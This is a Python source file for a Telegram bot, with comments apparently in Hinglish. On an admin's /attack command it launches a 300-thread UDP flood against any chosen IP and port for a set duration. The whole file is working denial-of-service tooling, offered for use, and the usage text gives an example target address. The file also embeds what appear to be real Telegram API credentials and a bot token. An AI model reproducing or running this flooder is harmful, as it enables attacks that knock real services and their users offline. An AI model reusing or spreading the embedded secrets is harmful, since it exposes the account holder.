import asyncio
import socket
import time
import os
from threading import Thread
from pyrogram import Client, filters

# 🔧 APNA CONFIG YAHAN DALO
API_ID = 37460343  # my.telegram.org se lo
API_HASH = "cf2d690b275e8d53a51fc69a15270437"  # my.telegram.org se lo
BOT_TOKEN = "8649236048:AAGcrxGdeSZpwcjtuMF-9zDKzyVISml-yNQ"  # @BotFather se lo
ADMIN_ID = 8819216195  # Apna Telegram ID

bot = Client("udp_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# 🚀 ATTACK ENGINE
class Attack:
    def __init__(self):
        self.running = False
        self.threads = 300
        
    def start(self, ip, port, duration):
        self.running = True
        payload = os.urandom(1490)
        end = time.time() + duration
        
        def flood():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while time.time() < end and self.running:
                try:
                    sock.sendto(payload, (ip, port))
                except:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        for _ in range(self.threads):
            Thread(target=flood).start()
        return f"🔥 ATTACK ON {ip}:{port} STARTED!"
    
    def stop(self):
        self.running = False
        return "🛑 ATTACK STOPPED!"

attack = Attack()

# 📝 COMMANDS
@bot.on_message(filters.command("start"))
async def start_cmd(client, msg):
    await msg.reply("🔥 **UDP BOT READY!**\n\n/attack IP PORT DURATION\n/stop\n/status")

@bot.on_message(filters.command("attack"))
async def attack_cmd(client, msg):
    if msg.from_user.id != ADMIN_ID:
        return await msg.reply("❌ ADMIN ONLY!")
    
    parts = msg.text.split()
    if len(parts) < 4:
        return await msg.reply("❌ /attack IP PORT DURATION\nExample: /attack 91.108.17.50 32000 60")
    
    ip, port, duration = parts[1], int(parts[2]), int(parts[3])
    result = attack.start(ip, port, duration)
    await msg.reply(f"{result}\n⏱️ {duration}s")

@bot.on_message(filters.command("stop"))
async def stop_cmd(client, msg):
    if msg.from_user.id != ADMIN_ID:
        return await msg.reply("❌ ADMIN ONLY!")
    await msg.reply(attack.stop())

@bot.on_message(filters.command("status"))
async def status_cmd(client, msg):
    if msg.from_user.id != ADMIN_ID:
        return await msg.reply("❌ ADMIN ONLY!")
    await msg.reply(f"⚡ RUNNING: {attack.running}\n🧵 THREADS: {attack.threads}")

print("🔥 BOT STARTED!")
bot.run()
